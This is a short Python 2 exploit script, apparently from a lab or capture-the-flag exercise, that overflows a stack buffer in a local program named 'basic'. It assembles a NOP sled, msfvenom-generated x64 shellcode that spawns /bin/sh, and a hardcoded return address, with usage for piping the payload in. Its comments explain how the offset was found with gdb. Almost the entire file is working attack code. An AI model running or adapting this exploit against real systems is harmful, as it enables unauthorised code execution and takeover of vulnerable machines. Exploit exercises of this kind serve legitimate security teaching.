#!/usr/bin/env python2

# Requirements:
#  - no ASRL
#  - no NX
#  - no stack canary
# 
# Usage:
# $ exploit.py > payload
# $ (cat payload; cat) | ./basic

import sys
from struct import pack

# Sets the Return address on the stack
# It can be found by exploiting with a buffer of 174 bytes and debugging the core dump with gdb
rip=pack("<Q", 0x7fffffffe330)

# NOP
nop=b"\x90"

# The shellcode for execve() without string termination chars
# msfvenom -p linux/x64/exec cmd=/bin/sh --format python -b "\x00\x0a"
shell = b""
shell += b"\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d\x05"
shell += b"\xef\xff\xff\xff\x48\xbb\x59\x3f\xb9\xa3\xc2\x2e\x6a"
shell += b"\x0d\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
shell += b"\x11\x87\x96\xc1\xab\x40\x45\x7e\x31\x3f\x20\xf3\x96"
shell += b"\x71\x38\x6b\x31\x12\xda\xf7\x9c\x7c\x82\x05\x59\x3f"
shell += b"\xb9\x8c\xa0\x47\x04\x22\x2a\x57\xb9\xf5\x95\x7a\x34"
shell += b"\x67\x62\x67\xb6\xa6\xc2\x2e\x6a\x0d"

# Assemble payload
buf =  b""
buf += nop * 20 
buf += shell
buf += nop * (160 - 20 - len(shell) + 8)
buf += rip

print buf
